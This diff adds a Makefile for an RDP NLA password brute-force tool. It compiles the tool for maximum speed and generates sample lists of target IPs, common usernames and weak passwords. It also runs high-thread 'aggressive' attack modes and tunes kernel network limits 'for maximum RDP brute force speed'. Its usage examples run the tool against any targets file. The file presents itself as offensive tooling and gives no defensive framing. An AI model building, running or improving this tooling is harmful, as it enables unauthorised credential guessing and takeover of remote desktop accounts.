@@ -1,0 +1,124 @@
+# Ultra-High-Performance RDP NLA Brute Force Tool Makefile
+# Optimized for maximum speed/pps on Ubuntu
+
+CC = gcc
+CFLAGS = -std=gnu11 -Wall -Wextra -O3 -march=native -mtune=native -funroll-loops \
+         -ffast-math -flto -DNDEBUG -D_GNU_SOURCE -D_FILE_OFFSET_BITS=64
+LDFLAGS = -lpthread -lrt -flto
+
+# Performance optimization flags
+OPTFLAGS = -finline-functions -fomit-frame-pointer -fno-stack-protector -pipe
+
+# Target architecture optimizations
+ARCHFLAGS = -msse4.2 -mavx -maes
+
+# Include directories
+INCLUDES = -I.
+
+# Source files
+SOURCES = rdp_brute_optimized.c
+TARGET = rdp-ultra
+
+# Default target
+all: $(TARGET)
+
+# Build ultra-performance target
+$(TARGET): $(SOURCES)
+	@echo "Building Ultra-High-Performance RDP Brute Force Tool..."
+	$(CC) $(CFLAGS) $(OPTFLAGS) $(ARCHFLAGS) $(INCLUDES) $(SOURCES) -o $(TARGET) $(LDFLAGS)
+	@echo "Build complete: $(TARGET)"
+	@echo "Optimization level: -O3 with LTO and native arch optimizations"
+
+# Create sample input files for testing
+samples:
+	@echo "Creating sample input files..."
+	echo "192.168.1.10" > ips.txt
+	echo "192.168.1.11" >> ips.txt
+	echo "192.168.1.12" >> ips.txt
+	echo "10.0.0.1" >> ips.txt
+	echo "10.0.0.2" >> ips.txt
+	echo "administrator" > users.txt
+	echo "admin" >> users.txt
+	echo "user" >> users.txt
+	echo "guest" >> users.txt
+	echo "service" >> users.txt
+	echo "Password123" > passwords.txt
+	echo "password" >> passwords.txt
+	echo "123456" >> passwords.txt
+	echo "admin" >> passwords.txt
+	echo "password123" >> passwords.txt
+	echo "" >> passwords.txt
+	@echo "Sample files created: ips.txt, users.txt, passwords.txt"
+
+# Run speed test
+test-speed: $(TARGET) samples
+	@echo "Running speed test with sample data..."
+	./$(TARGET) -i ips.txt -u users.txt -p passwords.txt -o test_results.txt -f -t 50
+
+# Run aggressive mode test
+test-aggressive: $(TARGET) samples
+	@echo "Running aggressive mode test..."
+	./$(TARGET) -i ips.txt -u users.txt -p passwords.txt -o aggressive_results.txt -a
+
+# Debug build
+debug:
+	$(CC) -std=gnu11 -Wall -Wextra -O0 -g -DDEBUG -D_GNU_SOURCE $(INCLUDES) $(SOURCES) -o $(TARGET)-debug $(LDFLAGS)
+
+# Clean
+clean:
+	rm -f $(TARGET) $(TARGET)-debug *.o *.txt *.log
+
+# Install system dependencies
+deps:
+	@echo "Checking system dependencies..."
+	@which gcc > /dev/null || (echo "Installing gcc..." && sudo apt-get update && sudo apt-get install -y gcc)
+	@which make > /dev/null || (echo "Installing make..." && sudo apt-get install -y make)
+	@echo "All dependencies satisfied"
+
+# Performance tuning
+tune-system:
+	@echo "Applying system performance tunings for maximum RDP brute force speed..."
+	@echo "Setting TCP parameters for high connection rates..."
+	sudo sysctl -w net.ipv4.ip_local_port_range="1024 65535"
+	sudo sysctl -w net.core.somaxconn=65535
+	sudo sysctl -w net.core.netdev_max_backlog=5000
+	sudo sysctl -w net.ipv4.tcp_max_syn_backlog=65535
+	sudo sysctl -w net.ipv4.tcp_fin_timeout=30
+	sudo sysctl -w net.ipv4.tcp_keepalive_time=120
+	sudo sysctl -w net.ipv4.tcp_tw_reuse=1
+	sudo sysctl -w fs.file-max=1000000
+	@echo "Increasing process limits..."
+	ulimit -n 1000000
+	@echo "System tuned for maximum performance!"
+	@echo "Note: Some settings require root privileges and may need manual configuration"
+
+# Show usage examples
+examples:
+	@echo "Ultra-High-Performance RDP Brute Force Tool - Usage Examples:"
+	@echo ""
+	@echo "Basic usage (fast mode for max speed):"
+	@echo "  ./$(TARGET) -i targets.txt -u users.txt -p passwords.txt -o results.txt -f"
+	@echo ""
+	@echo "Aggressive mode (maximum threads and speed):"
+	@echo "  ./$(TARGET) -i targets.txt -u users.txt -p passwords.txt -o results.txt -a"
+	@echo ""
+	@echo "Custom thread count:"
+	@echo "  ./$(TARGET) -i targets.txt -u users.txt -p passwords.txt -o results.txt -t 300"
+	@echo ""
+	@echo "Verbose output with failed attempts:"
+	@echo "  ./$(TARGET) -i targets.txt -u users.txt -p passwords.txt -o results.txt -v"
+	@echo ""
+	@echo "Custom RDP port:"
+	@echo "  ./$(TARGET) -i targets.txt -u users.txt -p passwords.txt -o results.txt -P 3390"
+	@echo ""
+	@echo "Maximum performance configuration:"
+	@echo "  ./$(TARGET) -i targets.txt -u users.txt -p passwords.txt -o results.txt -f -t 500"
+
+# Benchmark
+benchmark: $(TARGET) samples
+	@echo "Running performance benchmark..."
+	@echo "Testing with 5 IPs x 5 users x 5 passwords = 125 combinations"
+	time ./$(TARGET) -i ips.txt -u users.txt -p passwords.txt -o benchmark_results.txt -f -t 100
+	@echo "Benchmark complete. Check benchmark_results.txt for results."
+
+.PHONY: all samples test-speed test-aggressive debug clean deps tune-system examples benchmark
